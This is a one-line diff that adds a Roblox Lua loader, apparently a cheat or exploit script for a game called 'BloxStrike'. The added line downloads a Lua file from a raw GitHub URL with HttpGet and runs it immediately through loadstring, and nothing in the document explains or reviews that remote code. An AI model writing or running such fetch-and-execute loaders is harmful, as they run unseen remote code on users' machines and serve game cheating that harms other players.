@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/new-map-bloxstrike-spam3-jl3dzlq0dmk6xq.lua"))()
